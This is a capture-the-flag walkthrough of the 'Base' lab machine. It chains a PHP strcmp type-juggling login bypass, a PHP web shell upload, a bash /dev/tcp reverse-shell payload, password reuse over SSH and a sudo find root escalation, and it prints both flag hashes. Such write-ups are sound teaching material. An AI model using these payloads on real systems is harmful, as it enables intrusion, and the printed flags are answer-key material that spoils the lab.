# Base

## Base Write-up

Prepared by: dotguy

## Introduction

PHP is one of the most popular back-end languages in the world. It's flexible, cross-platform compatible, cost-efficient and easy to learn. Services like Facebook, Wikipedia, Tumblr, HackTheBox, and Yahoo are built with PHP, not to mention Wordpress and other content management systems. However, PHP can often be misconfigured, which leaves huge vulnerability holes in the system, which cyber criminals could exploit. Ethical Hackers & Penetration testers need to know how PHP works, along with the many varieties of misconfiguration that they can discover. The Base machine teaches us how useful it is to analyze code & how one slight mistake can lead to a fatal vulnerability.

## Enumeration

As always, we will check for open ports using an Nmap scan:

```bash
 └─$ sudo nmap -sC -sV 10.129.95.184   
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 22:16 EDT
Nmap scan report for 10.129.95.184
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to Base
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.74 seconds
```

The scan shows two ports open - Port 80 (HTTP) and Port 22 (SSH). We start off with enumerating port 80 using our web browser.

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

We can see a very simple webpage with the provided links in the navigation bar. By clicking the Login button, we are presented with the login page:

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Notice the URL of the login page is http://10.10.10.48/login/login.php .

We can see that there is a login directory, where the login.php is stored. Let's try accessing that directory by removing login.php from the end of the URL.

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

The /login folder seems to be configured as listable, and we can see the php files that are responsible for the login task. There's also a .swp file, which is a swap file.

Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor like Vim from editing the same file. More information on swap files can be found here.

The swap file was probably created due to a crash of the Vim application while the developer was editing the file. The file ended up being unnoticed and left in the web application files where anyone can download it by clicking on the login.php.swp in the listable directory. The web server is set up to handle requests to

.php files by running the PHP code in the file, but because the extension of the swap file isn't .php , the web server returns the raw code as text.

Let us click on this file and download it for further analysis. Navigate to the folder where the file is downloaded and read it to see if any parts of the code from login.php were saved. Typically the most straight forward way to recover a Vim swap file is with the vim -r \[swap file] . But sometimes these files can be particular and won't recover.

As .swp is a temporary file, it contains a lot of non-human-readable content, thus we will use the strings utility to read this swap file because strings will only display the human-readable text.

```
  strings login.php.swp
```

The Linux "strings" command makes it possible to view the human-readable characters within any file. The main purpose of using the "strings" command is to work out what type of file you're looking at, but you can also use it to extract text.

The output from the strings command is as follows:

<pre class="language-bash"><code class="lang-bash"><strong>└─$ strings login.php.swp             
</strong>b0VIM 8.0
root
base
/var/www/html/login/login.php
3210
#"! 
                  &#x3C;input type="text" name="username" class="form-control" style="max-width: 30%;" id="username" placeholder="Your Username" required>
                &#x3C;div class="form-group">
              &#x3C;div class="row" align="center">
            &#x3C;form id="login-form" action="" method="POST" role="form" style="background-color:#f8fbfe">
          &#x3C;div class="col-lg-12 mt-5 mt-lg-0">
        &#x3C;div class="row mt-2">
        &#x3C;/div>
          &#x3C;p>Use the form below to log into your account.&#x3C;/p>
          &#x3C;h2>Login&#x3C;/h2>
        &#x3C;div class="section-title mt-5" >
      &#x3C;div class="container" data-aos="fade-up">
    &#x3C;section id="login" class="contact section-bg" style="padding: 160px 0">
    &#x3C;!-- ======= Login Section ======= -->
  &#x3C;/header>&#x3C;!-- End Header -->
    &#x3C;/div>
      &#x3C;/nav>&#x3C;!-- .navbar -->
        &#x3C;i class="bi bi-list mobile-nav-toggle">&#x3C;/i>
        &#x3C;/ul>
          &#x3C;li>&#x3C;a class="nav-link scrollto action" href="/login.php">Login&#x3C;/a>&#x3C;/li>
          &#x3C;li>&#x3C;a class="nav-link scrollto" href="/#contact">Contact&#x3C;/a>&#x3C;/li>
          &#x3C;li>&#x3C;a class="nav-link scrollto" href="/#pricing">Pricing&#x3C;/a>&#x3C;/li>
          &#x3C;li>&#x3C;a class="nav-link scrollto" href="/#team">Team&#x3C;/a>&#x3C;/li>
          &#x3C;li>&#x3C;a class="nav-link scrollto" href="/#services">Services&#x3C;/a>&#x3C;/li>
          &#x3C;li>&#x3C;a class="nav-link scrollto" href="/#about">About&#x3C;/a>&#x3C;/li>
          &#x3C;li>&#x3C;a class="nav-link scrollto" href="/#hero">Home&#x3C;/a>&#x3C;/li>
        &#x3C;ul>
      &#x3C;nav id="navbar" class="navbar">
      &#x3C;!-- &#x3C;a href="index.html" class="logo">&#x3C;img src="../assets/img/logo.png" alt="" class="img-fluid">&#x3C;/a>-->
      &#x3C;!-- Uncomment below if you prefer to use an image logo -->
      &#x3C;h1 class="logo">&#x3C;a href="index.html">BASE&#x3C;/a>&#x3C;/h1>
    &#x3C;div class="container d-flex align-items-center justify-content-between">
  &#x3C;header id="header" class="fixed-top">
  &#x3C;!-- ======= Header ======= -->
&#x3C;body>
&#x3C;/head>
  &#x3C;link href="../assets/css/style.css" rel="stylesheet">
  &#x3C;!-- Template Main CSS File -->
  &#x3C;link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  &#x3C;link href="../assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  &#x3C;link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  &#x3C;link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  &#x3C;link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  &#x3C;link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  &#x3C;link href="../assets/vendor/aos/aos.css" rel="stylesheet">
  &#x3C;!-- Vendor CSS Files -->
  &#x3C;link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
  &#x3C;!-- Google Fonts -->
  &#x3C;link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
  &#x3C;link href="../assets/img/favicon.png" rel="icon">
  &#x3C;!-- Favicons -->
  &#x3C;meta content="" name="keywords">
  &#x3C;meta content="" name="description">
  &#x3C;title>Welcome to Base&#x3C;/title>
  &#x3C;meta content="width=device-width, initial-scale=1.0" name="viewport">
  &#x3C;meta charset="utf-8">
&#x3C;head>
&#x3C;html lang="en">
&#x3C;!DOCTYPE html>
    }
        print("&#x3C;script>alert('Wrong Username or Password')&#x3C;/script>");
    } else {
        }
            print("&#x3C;script>alert('Wrong Username or Password')&#x3C;/script>");
        } else {
            header("Location: /upload.php");
            $_SESSION['user_id'] = 1;
        if (strcmp($password, $_POST['password']) == 0) {
    if (strcmp($username, $_POST['username']) == 0) {
    require('config.php');
if (!empty($_POST['username']) &#x26;&#x26; !empty($_POST['password'])) {
session_start();
&#x3C;?php
&#x3C;/html>
&#x3C;/body>
  &#x3C;script src="../assets/js/main.js">&#x3C;/script>
</code></pre>

After checking the code, we can see HTML/PHP code, but it's out of order and a bit jumbled. Still, there's enough there that we can figure out what the code is trying to do. Specifically, the block of PHP code that handles login appears to be upside down. To make it look normal we can place the output of the strings command inside a new file and read it with the tac utility, which reads files similar to cat but instead does so in a backwards manner.

```
strings login.php.swp >> file.txt
tac file.txt
```

Now the output is much better for reading. After analyzing the file, here's the part that is interesting:

```bash
└─$ tac file.txt
  <script src="../assets/js/main.js"></script>
</body>
</html>
<?php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Welcome to Base</title>
  <meta content="" name="description">
  <meta content="" name="keywords">
  <!-- Favicons -->
  <link href="../assets/img/favicon.png" rel="icon">
  <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
  <!-- Vendor CSS Files -->
  <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="../assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  <!-- Template Main CSS File -->
  <link href="../assets/css/style.css" rel="stylesheet">
</head>
<body>
  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top">
    <div class="container d-flex align-items-center justify-content-between">
      <h1 class="logo"><a href="index.html">BASE</a></h1>
      <!-- Uncomment below if you prefer to use an image logo -->
      <!-- <a href="index.html" class="logo"><img src="../assets/img/logo.png" alt="" class="img-fluid"></a>-->
      <nav id="navbar" class="navbar">
        <ul>
          <li><a class="nav-link scrollto" href="/#hero">Home</a></li>
          <li><a class="nav-link scrollto" href="/#about">About</a></li>
          <li><a class="nav-link scrollto" href="/#services">Services</a></li>
          <li><a class="nav-link scrollto" href="/#team">Team</a></li>
          <li><a class="nav-link scrollto" href="/#pricing">Pricing</a></li>
          <li><a class="nav-link scrollto" href="/#contact">Contact</a></li>
          <li><a class="nav-link scrollto action" href="/login.php">Login</a></li>
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->
    </div>
  </header><!-- End Header -->
    <!-- ======= Login Section ======= -->
    <section id="login" class="contact section-bg" style="padding: 160px 0">
      <div class="container" data-aos="fade-up">
        <div class="section-title mt-5" >
          <h2>Login</h2>
          <p>Use the form below to log into your account.</p>
        </div>
        <div class="row mt-2">
          <div class="col-lg-12 mt-5 mt-lg-0">
            <form id="login-form" action="" method="POST" role="form" style="background-color:#f8fbfe">
              <div class="row" align="center">
                <div class="form-group">
                  <input type="text" name="username" class="form-control" style="max-width: 30%;" id="username" placeholder="Your Username" required>
#"! 
3210
/var/www/html/login/login.php
base
root
b0VIM 8.0
```

This file checks the username/password combination that the user submits against the variables that are stored in the config file (which is potentially communicating with a database) to see if they match.

Now, here's the issue:

```
if (strcmp($username , $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
```

The developer is using the strcmp function to check the username and password combination. This function is used for string comparison and returns 0 when the two inputted values are identical, however, it is insecure and the authentication process can potentially be bypassed without having a valid username and password.

This is due to the fact that if strcmp is given an empty array to compare against the stored password, it will return NULL . In PHP the == operator only checks the value of a variable for equality, and the value of NULL is equal to 0 . The correct way to write this would be with the === operator which checks both value and type. These are prominently known as "Type Juggling bugs" and a detailed video explanation on this can be found here.

In PHP, variables can be easily converted into arrays if we add \[] in front of them. For example:

```
$username = "Admin"
$username[] = "Admin"
```

Adding \[] changes the variable $username to an array, which means that strcmp() will compare the array instead of a string.

```
if (strcmp($username , $_POST['username']) == 0) {
   if (strcmp($password, $_POST['password']) == 0) {
```

In the above code we see that if the comparison succeeds and returns 0 , the login is successful. If we convert those variables into empty arrays ( $username\[] & $password\[] ), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.

In order to exploit this vulnerability, we will need to intercept the login request in BurpSuite. To do so fire up BurpSuite and configure the browser to use it as a proxy, either with the FoxyProxy plugin or the Browser configuration page. Then send a login request with a random set of credentials and catch the request in Burp.

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Change the POST data as follows to bypass the login.

```
  username[]=admin&password[]=pass
```

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

This converts the variables to arrays and after forwarding the request, strcmp() returns true and the login is successful. Once logged in, we see a file upload functionality.

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

## Foothold

Since the webpage can execute PHP code, we can try uploading a PHP file to check if PHP file uploads are allowed or not, and also check for PHP code execution.

Let us create a PHP file with the phpinfo() function, which outputs the configurational information of the PHP installation.

```
  echo "<?php phpinfo(); ?>" > test.php
```

After test.php has been created, choose the file after clicking the Upload button, and we will be presented with the following notification, which shows that the file was successfully uploaded.

Next, we need to figure out where uploaded files are stored. To do that, we will use Gobuster to do a directory brute force.

```
  gobuster dir --url http://10.10.10.48/ --wordlist /usr/share/wordlists/dirb/big.txt
```

The scan shows that a folder called \_uploaded exists. We will navigate to it to see if our file is there. It appears that this folder has also been set as listable and we can see all the files that are uploaded.

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Upon clicking on test.php , we can see the output of the phpinfo() command, thus confirming code execution.

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Let us now create a PHP web shell which uses the system() function and a cmd URL parameter to execute system commands.

Place the following code into a file called webshell.php . \<?php echo system($\_REQUEST\['cmd']);?>

We are making use of the $\_REQUEST method to fetch the cmd parameter because it works for fetching both URL parameters in GET requests and HTTP request body parameters in case of POST requests. Furthermore, we also use a POST request later in the walkthrough, thus using the $\_REQUEST method is the most effective way to fetch the cmd parameter in this context.

After the web shell has been created, upload it as shown previously.

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

After the file has been uploaded, click on it in the browser and it will show a blank page, however, if we add a system command in the cmd URL parameter, the PHP backend will execute its value, e.g: ?cmd=id .

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

The above URL returns with the output of the id command, letting us know that Apache is running in the context of the user www-data . Let's intercept this request in BurpSuite and send it to the repeater tab by pressing the CTRL+R shortcut, or by right-clicking inside the request and selecting Send to Repeater .

Now that we know we can execute code on the remote system, let's attempt to get a reverse shell. The current request is an HTTP GET request and we can attempt to use it to send a command that will grant us a reverse shell on the system, however, it is likely that one might encounter errors due to the presence of special characters in the URL (even after URL encoding them). Instead, let us convert this GET request to a POST request and send the reverse shell command as an HTTP POST parameter.

Right-click inside the Request body box, and click on the "Change request method" in order to convert this HTTP GET request to an HTTP POST request.

In the repeater tab, we can alter the request and set the following reverse shell payload as a value for the cmd parameter.

```
  /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
```

This reverse shell payload will make the remote host connect back to us with an interactive bash shell on the specified port that we are listening on.

In order to execute our payload, we will have to first URL encode it. For URL encoding the payload, select the payload text in the request body and press CTRL+U .

It's important to URL encode the payload, or else the server will not interpret the command correctly. For example, in the POST body, the & character is used to signal the start of a new parameter. But we have two

& characters in our string that are both a part of the cmd parameter. By encoding them, this tells the server to treat this entire string as part of cmd .

Let's now start a Netcat listener on port 443 and then send the request in Burp for the payload to execute.

```
sudo nc -lvnp 443
```

A reverse shell on the system is successfully received.

## Lateral Movement

As we already know, the Apache server is running as the www-data use and the shell we received is also running in the context of this user. www-data is a default user on systems where web servers are installed and usually has minimal privileges. Let's enumerate the system to see if we can find any interesting information that might allow us to escalate our privileges.

We will first check the configuration file in the login folder that we found earlier. These configuration files often include credentials that are used to communicate with SQL or other types of data storage servers. Let's read it.

```
  cat /var/www/html/login/config.php
```

The config.php file reveals a set of credentials. System administrators often re-use passwords between web and system accounts so that they do not forget them. Let us enumerate further to see if this password is valid for any system user. To do that, we will first list the files in the /home directory to quickly identify the users on the system.

```
$username = "admin";
$password = "thisisagoodpassword";
```

ls /home\
A folder called John is found, which gives us a valid username.

The su command can usually be used to switch to a different user in Linux, however, as our shell is not fully interactive, this command will fail. There are methods for upgrading this shell to an interactive one, but luckily, the Nmap scan showed that port 22 is open, which means we can attempt to log in as the user John over SSH with the password that we identified.

```
  ssh john@10.10.10.48
```

This is successful and the flag can be found in the users home directory, i.e. /home/john/user.txt .&#x20;

f54846c258f3b4612f78a819573d158e

## Privilege Escalation

We now need to escalate our privileges to that of the root user, who has the highest privileges in the system. Instead of running a system enumeration tool like linPEAS , let us first perform some basic manual enumeration. Upon checking the sudo -l command output, which lists the sudo privileges that our user is assigned, we see that user john can run the find command as a root.

sudo -l

It is rarely a good idea to allow a system user to run a binary with elevated privileges, as the default binaries on Linux often contain parameters that can be used to run system commands. A good list of these binaries can be found in the GTFOBins website.

For windows systems, the equivalent of this is the LOLBAS.\
Once we navigate to the GTFObins website, we can search for find .

```
GTFOBins is a curated list of Unix binaries that can be used to bypass local security
restrictions in misconfigured systems.
```

Under the Sudo section we see the following.

According to GTFOBins , we need to run the following command in order to escalate our privileges:

&#x20;sudo find . -exec /bin/sh \\; -quit

The -exec flag is used with find to run some command on each matching file that is found. We'll abuse this to just run a shell, and since the process is running as root (from sudo ), that shell will also be running as root. Instead of sh , we will use bash as it offers better syntax and it is actually an improvement over

sh . Once we run this command, we successfully obtain a root shell.

The root flag can be found in the root folder, /root/root.txt . You have successfully finished the Base machine. Congratulations!

51709519ea18ab37dd6fc58096bea949

